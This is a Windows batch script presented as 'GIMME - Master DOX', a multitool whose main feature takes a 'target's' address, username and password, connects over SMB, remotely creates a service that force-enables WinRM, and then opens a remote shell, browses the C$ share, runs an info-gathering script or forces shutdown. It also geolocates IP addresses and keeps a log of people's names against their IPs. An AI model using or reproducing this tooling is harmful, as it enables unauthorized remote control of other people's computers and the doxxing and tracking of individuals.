@echo off
cd files >nul
mode 100,30
color 0B
title (GIMME - Master DOX)


rem SERVICES
set success=[92m[+][0m
set warning=[91m[!][0m
set info=[94m[*][0m
set servicename=winrm%random%
setlocal ENABLEDELAYEDEXPANSION
set webclient=webclient
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul

:administratorCheck
cls
@echo off
:: Check if the script is run as administrator
>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"

:: If the error level is 0, the script is run as administrator
if %errorlevel% EQU 0 (
    goto Password
    
) else (
color 6
	echo.
	echo.
    echo Run it as administrator lil bro. 
	echo.
	echo (Right click "run.bat" then "Run as administrator"
	echo.
	echo.
	echo.
    pause
    exit
)


rem PASSWORD PROTECTION --------------------------
:Password
mode 55,3
cls
color 07
echo.
set /p "pass=What's the password lil bro: "
if NOT %pass%==aids goto :FAIL
goto :end
:FAIL
cls
echo.
echo.
echo (type "i suck" to retry the pass or any key to CLOSE)
set /p input=
if "%input%"=="i suck" goto Password
exit
:end
cls
echo.
echo Logged in as [%Username%]
timeout /nobreak /t 1 >nul

rem MAIN MENU -------------------------------------

:start
cls
mode 100, 25
chcp 65001 >nul
echo.
echo.
echo [96m                           ██████╗ ██╗███╗   ███╗███╗   ███╗███████╗[0m
echo [96m                          ██╔════╝ ██║████╗ ████║████╗ ████║██╔════╝[0m
echo [96m                          ██║  ███╗██║██╔████╔██║██╔████╔██║█████╗  [0m
echo [96m                          ██║   ██║██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  [0m
echo [96m                          ╚██████╔╝██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗[0m
echo [96m                           ╚═════╝ ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝[0m
echo. 
echo [96m                     ---------------------------------------------------[0m
echo.
echo                                        ╔════════════╗
echo                               1.       ║  Tutorial  ║
echo                                        ╚════════════╝
echo.
echo                                        ╔════════════╗
echo                               2.       ║    Exit    ║
echo                                        ╚════════════╝
echo.
echo                                        ╔════════════╗
echo                               3.       ║  Next page ║
echo                                        ╚════════════╝
echo.
echo.
echo.
set /p input=">> " <nul
choice /c 123 >nul

if /I "%errorlevel%" EQU "1" (
	goto tutorial
)

if /I "%errorlevel%" EQU "2" (
	Exit
)

if /I "%errorlevel%" EQU "3" (
	goto page2
)

:page2
cls
mode 100, 40
chcp 65001 >nul
echo.
echo.
echo [96m                           ██████╗ ██╗███╗   ███╗███╗   ███╗███████╗[0m
echo [96m                          ██╔════╝ ██║████╗ ████║████╗ ████║██╔════╝[0m
echo [96m                          ██║  ███╗██║██╔████╔██║██╔████╔██║█████╗  [0m
echo [96m                          ██║   ██║██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  [0m
echo [96m                          ╚██████╔╝██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗[0m
echo [96m                           ╚═════╝ ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝[0m
echo. 
echo [96m                     ---------------------------------------------------[0m
echo.
echo.
echo                                        ╔════════════╗
echo                               1.       ║ Pc Control ║
echo                                        ╚════════════╝
echo.
echo                                        ╔════════════╗
echo                               2.       ║ IP Look Up ║
echo                                        ╚════════════╝
echo.
echo                                        ╔════════════╗
echo                               3.       ║   Logger   ║
echo                                        ╚════════════╝
echo.
echo                                        ╔════════════╗
echo                               4.       ║    Exit    ║
echo                                        ╚════════════╝
echo.
echo                                        ╔════════════╗
echo                               5.       ║  Next page ║
echo                                        ╚════════════╝
echo.
echo                                        ╔════════════╗
echo                               6.       ║  Main menu ║
echo                                        ╚════════════╝
echo.
echo                                        ╔════════════╗
echo                               7.       ║  Dox Text  ║
echo                                        ╚════════════╝
echo.
echo.
set /p input=">> " <nul
choice /c 1234567 >nul

if /I "%errorlevel%" EQU "1" (
	goto pcControlMenu
)

if /I "%errorlevel%" EQU "2" (
	goto iplookup
)

if /I "%errorlevel%" EQU "3" (
	goto Logger
)

if /I "%errorlevel%" EQU "4" (
	Exit
)

if /I "%errorlevel%" EQU "5" (
	goto page2
)

if /I "%errorlevel%" EQU "6" (
	goto start
)

if %errorlevel% EQU 7 (
	goto doxtext
)


:doxtext
cls
call :banner
echo.
echo                           ╔══════════════════════════════════════╗
echo                           ║        Enter text to convert         ║ 
echo                           ║  (On website you can change font or  ║
echo                           ║ enter "y" when asked for ANSI Shadow)║
echo                           ╚══════════════════════════════════════╝
echo.
echo.
echo                                          ╔══════╗
echo                                          ║ Text ║
echo                                          ╚══════╝
set /p name=">> " 
echo.
echo Do you want "%name%" in ANSI Shadow font?
set /p font="[Y or N] " (
if "%font%"=="y" goto run
) ELSE (
  goto runsimple
)

:run
set "font=ANSI Shadow"
set "url=https://patorjk.com/software/taag/#p=display&f=%font%&t=%name%"
start "" "%url%"
goto start

:runsimple
set "url=https://patorjk.com/software/taag/#p=display&f=Graffiti&t=%name%"
start "" "%url%"
goto start




:logger
cls
call :banner
echo.
echo                            ╔═════════════════════════════════════╗
echo                            ║  Enter "1" to open Logs, "b" to go  ║ 
echo                            ║      back, and "t" for Tutorial     ║
echo                            ╚═════════════════════════════════════╝
echo.
echo.
echo                                          ╔══════╗
echo                                          ║ Name ║
echo                                          ╚══════╝
set /p name=">> " 
echo.
if %name% == 1 goto open
if %name% == b goto start
echo.
echo.                                         ╔══════╗      
echo                                          ║  IP  ║
echo                                          ╚══════╝
echo.
set /p IP=">> " 
if %IP% == b goto logger
echo.
echo.
echo                                        ╔══════════╗
echo                                        ║ Preview? ║
echo                                        ╚══════════╝
echo.
set /p preview="[Y or N] "
if /i "%preview%"=="y" (
	echo ------------------------------------------
    echo --  %name%  //  %IP%  \\  -  //  %date%  at  %time%  \\
	echo ------------------------------------------
    set /p confirm="Save? [Y or N] "
    if /i "%confirm%"=="y" goto saveEntry
) else (
    goto Logger
)

:saveEntry
echo --  %name%  //  %IP%  \\  -  //  %date%  at  %time%  \\>> "%~dp0Files\IPLogs.txt"
echo.
echo {+}- %name%'s Info Saved in Your Database -{+}
echo {+}- Press Any Key to Restart IP Logs -{+}
pause >nul
goto logger


:open
cls
type "%~dp0Files\IPLogs.txt"
echo.
echo.
echo Type "n" to go back to Main Menu
echo ---------------------------------
set /p clear="Clear all data? [Y or N]"
if "%clear%"=="n" goto start
set /p final="[41mAre you sure?[0m [Y or N]"
if /i "%final%"=="y" (
    echo. > "%~dp0Files\IPLogs.txt"
)
goto start



rem PC CONTROLL --------------------------------------
:pcControlMenu
cls
mode 100,40
call :banner
echo.
echo.
echo                                        ╔════════════╗
echo                                        ║  Computer  ║
echo                                        ╚════════════╝
echo.
set /p domain=">> "
if "%domain%"=="i" goto start
echo.
echo                                        ╔════════════╗
echo                                        ║  Username  ║
echo                                        ╚════════════╝
echo.
set /p user=">> "
echo.
echo                                        ╔════════════╗
echo                                        ║  Password  ║
echo                                        ╚════════════╝
echo.
set /p pass=">> "
echo.
echo %info% Connecting to %domain%...
rem Disconnects any running connections
net use \\%domain% /user:%user% %pass% >nul 2>&1
rem Connects to the PC with SMB
net use \\%domain% /user:%user% %pass% >nul 2>&1

if /I "%errorlevel%" NEQ "0" (
  echo %warning% Invalid Credentials or Network Issue
  pause
  goto start
)

echo %success% Connected!

:winrm
echo %info% Checking for WinRM...
chcp 437 >nul
powershell -Command "Test-WSMan -ComputerName %domain%" >nul 2>&1
set errorcode=%errorlevel%
chcp 65001 >nul

if /I "%errorcode%" NEQ "0" (
  echo %info% Creating Remote Service...
  rem Creates a service on the remote PC that enables WinRM
  sc \\%domain% create %servicename% binPath= "cmd.exe /c winrm quickconfig -force"
  echo %success% Configuring WinRM...
  sc \\%domain% start %servicename%
  echo %info% Deleting Service...
  sc \\%domain% delete %servicename%
  goto PcControl
)

if /I "%errorcode%" EQU "0" (
  chcp 65001 >nul
  echo %success% %domain% has WinRM Enabled!
  timeout /t 3 >nul
  goto PcControl
)



:PcControl
cls
echo.
echo %info% Connected to %domain%
echo.
echo [95m[1][0m » Shell
echo [95m[2][0m » Files
echo [95m[3][0m » Information
echo [95m[4][0m » Shutdown
echo [95m[5][0m » Disconnect
echo.
set /p " =>> " <nul
choice /c 12345 >nul

if /I "%errorlevel%" EQU "1" (
  cls
  echo.
  echo %success% Opening Remote Shell...
  echo.
  rem Opens remote cmd with WinRS
  winrs -r:%domain% -u:%user% -p:%pass% cmd
  goto PcControl
)

if /I "%errorlevel%" EQU "2" (
  start "" "\\%domain%\C$"
  cls
  goto PcControl
)

if /I "%errorlevel%" EQU "3" (
  cls
  echo.
  echo %info% Gathering Info..
  copy "info.bat" "\\%domain%\C$\ProgramData\info.bat" >nul
  winrs -r:%domain% -u:%user% -p:%pass% C:\ProgramData\info.bat
  pause
  del "\\%domain%\C$\ProgramData\info.bat"
  goto PcControl
)

if /I "%errorlevel%" EQU "4" (
  winrs -r:%domain% -u:%user% -p:%pass% "shutdown /s /f /t 0"
  cls
  goto PcControl
)

if /I "%errorlevel%" EQU "5" (
  net use \\%domain% /d /y >nul 2>&1
  goto start
)

rem -----------------------------------------------

:pcConInfo
mode 100,50
cls
call :banner
echo.
echo.
echo.
echo.
echo                                        ╔════════════╗
echo                                        ║  Computer  ║   -- Enter the targets IP or Domain
echo                                        ╚════════════╝
echo.
echo                                        ╔════════════╗
echo                                        ║  Username  ║   -- Enter targets username 
echo                                        ╚════════════╝
echo.                                       
echo                                        ╔════════════╗
echo                                        ║  Password  ║   -- Enter targets password
echo                                        ╚════════════╝
echo.
echo.
echo.
set /p choice=:
if "%choice%"=="i" goto pcCon
goto start

rem -----------------------------------------------


:Tutorial
cls
call :banner
echo.
echo.
echo        ╔════════════════════════════════════════════════════════════════════════════════════╗
echo        ║ Hello, this is GIMME the best multitool. GIMME has many features, some confusing.  ║
echo        ║ So here's a tutorial. Whenever you want you can type "b" to go to the previous page║
echo        ║ and "i" to get a small tutorial on how to use the feature wanted unless the page   ║
echo        ║ says other wise. If you do not understand a feature then [41mDO NOT USE IT.[0m            ║
echo        ╚════════════════════════════════════════════════════════════════════════════════════╝
echo.
set /p input="type b: " 
goto start

:iplookup
cls
echo.
call :banner
echo.
echo.
echo                                   ╔══════════════════════╗
echo                                   ║ Type an IP to lookup ║
echo                                   ╚══════════════════════╝
set ip=127.0.0.1
set /p ip=">> " 
echo sUrl = "http://ipinfo.io/%ip%/json" > %temp%\%webclient%.vbs


:localip
cls
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
rem echo Msgbox HTTPGET,vbSystemModal+vbOKOnly+vbInformation, "IP Info" >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0
echo.
rem echo Waiting for API response. . .
echo  Looking up IP Address. . .
:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto failed
IF EXIST "%temp%\response.txt" (
goto response_exist
) ELSE (
ping 127.0.0.1 -n 2 -w 1000 >nul
goto checkresponseexists
)
:failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo Did not receive a response from the API.
echo.
pause
goto menu
:response_exist
cls
echo.
echo.
call :banner
echo.
for /f "delims= 	" %%i in ('findstr /i "ip hostname city region country loc org postal" %temp%\response.txt') do (
	set data=%%i
	set data=!data:,=!
	set data=!data:""=Not Listed!
	set data=!data:"=!
	set data=!data:ip:=IP:		!
	set data=!data:hostname:=Hostname:	!
	set data=!data:city:=City:		!
	set data=!data:region:=State:	!
	set data=!data:country:=Country:	!
	set data=!data:loc:=Location:	!
	set data=!data:org:=ISP:		!
	set data=!data:postal:=Postal:	!
	echo !data!
)
echo.
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
pause
goto start


:banner
echo.
echo.
echo [96m                           ██████╗ ██╗███╗   ███╗███╗   ███╗███████╗[0m
echo [96m                          ██╔════╝ ██║████╗ ████║████╗ ████║██╔════╝[0m
echo [96m                          ██║  ███╗██║██╔████╔██║██╔████╔██║█████╗  [0m
echo [96m                          ██║   ██║██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  [0m
echo [96m                          ╚██████╔╝██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗[0m
echo [96m                           ╚═════╝ ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝[0m
echo.                     
echo [96m                     ---------------------------------------------------[0m